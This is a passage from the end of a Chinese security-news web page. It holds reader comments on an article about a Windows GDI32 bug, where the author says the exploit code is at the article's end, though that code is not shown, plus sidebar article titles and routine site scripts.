                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="0" class="response" data-bind-id="0" data-target="12576" user-name="我叫0day谁找我_" href="javascript:;">
                我叫0day谁找我_            </a>
                        <span class="comment-time">2017-03-23 12:11:10</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="12576">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_12576" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">回复@老实敦厚的大宝:来呀，北京请你喝豆汁儿</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>
<div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src="/img/photo/2x48x48.png">
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="0" class="response" data-bind-id="0" data-target="12575" user-name="家家变老蒋" href="javascript:;">
                家家变老蒋            </a>
                        <span class="comment-time">2017-03-23 12:11:10</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="12575">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_12575" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">很好，反正看不懂。</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>
<div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src="/img/photo/9x48x48.png">
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="0" class="response" data-bind-id="0" data-target="12574" user-name="安全客官方微博" href="javascript:;">
                安全客官方微博            </a>
                        <span class="comment-time">2017-03-23 12:11:10</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="12574">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_12574" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">回复@我叫0day谁找我_:</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>
<div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src="/img/photo/4x48x48.png">
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="0" class="response" data-bind-id="0" data-target="12573" user-name="Mr-七先森" href="javascript:;">
                Mr-七先森            </a>
                        <span class="comment-time">2017-03-23 12:11:10</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="12573">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_12573" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">师傅厉害厉害</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>
<div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src="/img/photo/11x48x48.png">
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="0" class="response" data-bind-id="0" data-target="12572" user-name="nU1I" href="javascript:;">
                nU1I            </a>
                        <span class="comment-time">2017-03-23 11:50:54</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="12572">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_12572" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">//@我叫0day谁找我_:web safe color是一个磨人的小妖精，最后发现这个洞并不一定像推特上说的可以泄露浏览器敏感数据，GDI32里还有好多有意思的东西我用js和c写的exp已经放在文章末尾，js考错了文件稍微差一点，今晚会更新成最新的</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>
<div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src="/img/photo/9x48x48.png">
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="0" class="response" data-bind-id="0" data-target="12569" user-name="natal1e13" href="javascript:;">
                natal1e13            </a>
                        <span class="comment-time">2017-03-23 11:30:54</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="12569">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_12569" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">//@我叫0day谁找我_:web safe color是一个磨人的小妖精，最后发现这个洞并不一定像推特上说的可以泄露浏览器敏感数据，GDI32里还有好多有意思的东西我用js和c写的exp已经放在文章末尾，js考错了文件稍微差一点，今晚会更新成最新的</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>

        <a class="more-long comment-more" href="javascript:;" data-target="/comment/more" data-type="learning" data-source-id="3644" data-page="2">查看更多</a>
            </div>
</div>
<script>
    $(function () {
        $('.anonymous-comment').click(function () {
            $(".join").hide();
            $(".reg-log textarea").first().removeAttr("disabled").show();
            $('#use_nickname').val('1');
//            $('#trigger-nickname').attr('checked', true);
            $('#trigger-nickname').trigger('click');
        });
        //为所有复选框绑定事件
//        checkbox_on_click();
        //ajax随机获取昵称
//        randnicknameajax(0);
        //ajax检测登录状态
        comment_check_login();
    });



    function input_checkbox(flag) {
        $('input:checkbox').each(function () {
            var value = flag ? 1 : 0;
            $(this).prop('checked', flag);
            $(this).val(value);
        });
    }

//ajax随机获取昵称
    function randnicknameajax(flag) {
        $.ajax({
            type: 'POST',
            url: $('#post-nickname-url-ajax').val(),
            data: {limit: 1, flag: flag},
            dataType: "json",
            success: function (data) {
                $('#nick-name').val(data.data[0]);
                _nick_name=data.data[0];
            }
        });
    }
    $();
//ajax检测登录状态
    function comment_check_login() {
        $.ajax({
            type: 'POST',
            url: $('#post-check-login-url-ajax').val(),
            data: {},
            dataType: "json",
            success: function (data) {
                if (data.success) {
                    $('.join').hide();
                    $(".reg-log textarea").first().removeAttr("disabled").show();
                    $("#span_use_nickname").show();
                    $('#use_nickname').val('0');
                    $('#use_nickname').attr('checked', false);
                }
            }
        });
    }
</script>        </div>
    </div>
    <div class="side-bar">
        <div class="mod hot-news">
    <div class="head-bar clearfix">
        <h2><i class="icon icon-hot"></i><span>热门知识</span></h2>
    </div>
    <ul class="links-list">
                                <li><a href="/learning/detail/4411.html" alt="【漏洞预警】一个换行符引发的奥斯卡0day漏洞(CVE-2017-8759)重现——最新的Office高级威胁攻击预警" target="_blank">【漏洞预警】一个换行符引发的奥斯卡...</a></li>
                                <li><a href="/learning/detail/4416.html" alt="【漏洞预警】Microsoft .NET Framework漏洞（CVE–2017–8759）预警" target="_blank">【漏洞预警】Microsoft .NE...</a></li>
                                <li><a href="/learning/detail/4414.html" alt="【技术分享】妙用JavaScript绕过XSS过滤" target="_blank">【技术分享】妙用JavaScrip...</a></li>
                                <li><a href="/learning/detail/4418.html" alt="【技术分享】利用威胁情报数据平台拓展APT攻击线索一例" target="_blank">【技术分享】利用威胁情报数据平台拓...</a></li>
                                <li><a href="/learning/detail/4417.html" alt="【知识】9月15日 - 每日安全知识热点" target="_blank">【知识】9月15日 - 每日安全知识热...</a></li>
                                <li><a href="/learning/detail/4425.html" alt="【安全报告】XShellGhost事件技术回顾报告" target="_blank">【安全报告】XShellGhost事件...</a></li>
            </ul>
</div>        <!-- 友情链接 -->
        <div class="mod blog-links mobile-hide">
    <div class="head-bar clearfix">
        <h2><i class="icon icon-link"></i><span>友情链接</span></h2>
        <a href="/links/index.html" class="more">更多<i></i></a>
    </div>
        <ul class="links-list">
                <li><a href="http://bbs.360safe.com" alt="360安全社区" target="_blank">360安全社区</a></li>
                <li><a href="http://zhuji.360.cn" alt="360主机卫士" target="_blank">360主机卫士</a></li>
                <li><a href="http://blogs.360.cn/" alt="奇虎360技术博客" target="_blank">奇虎360技术博客</a></li>
                <li><a href="http://wangzhan.360.cn/" alt="360网站卫士" target="_blank">360网站卫士</a></li>
                <li><a href="http://webscan.360.cn/" alt="360网站安全检测" target="_blank">360网站安全检测</a></li>
                <li><a href="http://research.360.cn/report/" alt="360研究报告" target="_blank">360研究报告</a></li>
                <li><a href="http://unicorn.360.cn/" alt="360 Unicorn Team" target="_blank">360 Unicorn Team</a></li>
                <li><a href="http://appscan.360.cn/" alt="360捉虫猎手" target="_blank">360捉虫猎手</a></li>
                <li><a href="https://threathunter.org/" alt="ThreatHunter社区" target="_blank">ThreatHunter社区</a></li>
                <li><a href="http://security.360.cn/" alt="360安全应急响应中心" target="_blank">360安全应急响应中心</a></li>
            </ul>
    </div>
        <!-- 联系我们 -->
        <div class="mod contact mobile-hide" style="text-align:center">
    <div class="head-bar clearfix">
        <h2><i></i><span>关注我们</span></h2>
    </div>
    <!-- 微信关注 -->
    <ul class="contact-way">
        <li><a>微信关注</a></li>
    </ul>
    <div style="padding-left:20px;padding-bottom:15px;">
    <img src="/img/qrcode_adlab_weixin.png?v=1.1"  width="145px" height="145px;"/>
    </div>
    
    <!-- APP下载 -->
    <ul class="contact-way">
        <li><a>安全播报APP</a></li>
    </ul>
    <div style="padding-left:20px;padding-bottom:15px;">
    <img src="/img/scan_code_big.png?v=1.1"  width="145px" height="145px;"/>
    </div>
    
</div>

    </div>
</div>

<script type="text/javascript" src="/js/jquery-ui.min.js?v=3.0"></script>
<script type="text/javascript" src="/js/jquery.noty.packaged.min.js?v=3.0"></script>
<script type="text/javascript" src="/js/common.js?v=4.5"></script>
<script>$(function() {sync_count('comment');});</script>


<!-- 语法高亮 -->
<script type="text/javascript" src="/ue/SyntaxHighlighter/shCore.js"></script>
<script type="text/javascript">SyntaxHighlighter.all();sync_count('vul');sync_count('news');sync_count('learning');sync_count('activity');sync_count('course');sync_count('ctf');</script>
    </div>

        <div class="footer">
        <div class="friend-link">
            <a href="http://www.360.cn/" target="_blank">360首页</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">关于我们</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">联系我们</a>
            <span>|</span>
            <a href="/links/index.html" target="_blank">友情链接</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">招贤纳士</a>
        </div>
        <div class="copy">
            Copyright &copy; 360网络攻防实验室 All Rights Reserved <span class="copy_icp">京ICP证080047号[京ICP备08010314号-6]</span>
        </div>
    </div>
    
</div>

<!--奇舞团统计-->

<script src='https://s.ssl.qhimg.com/static/f5407c785655e6a1/monitor_analytic.js'></script>
<script>
    monitor.setProject('QH_171_1').getTrack().getClickAndKeydown().getClickHeatmap(10, 1);
</script>

<div class="hide">
    <script src="https://s95.cnzz.com/z_stat.php?id=1253147824&web_id=1253147824" language="JavaScript"></script>
</div>
<div class="backToTop_wrap off">
    <a id="back_to_top" class="backToTop" href="javascript:;" title="返回顶部"></a>
</div>
<script>
    var $backToTop_wrap = $(".backToTop_wrap"),
        $backToTop_btn = $("#back_to_top");

    if ($(window).scrollTop() > 100) {
        $backToTop_wrap.removeClass("off");
    }
    else {
        $backToTop_wrap.addClass("off");
    }

    $(window).on("scroll", function () {
        if ($(this).scrollTop() > 100) {
            $backToTop_wrap.removeClass("off");
        }
        else {
            $backToTop_wrap.addClass("off");
        }
    });

    $backToTop_btn.on("click", function () {
        $("html, body").animate({scrollTop: 0}, 120);
    });

    $(function () {
        var navlist = $('.nav-list > li');

        navlist.each(function () {
            $(this).on('mouseenter', function () {
                $(this).addClass('selected');
            });

            $(this).on('mouseleave', function () {
                $(this).removeClass('selected');
            });
        });
    })
</script>



</body>
</html>
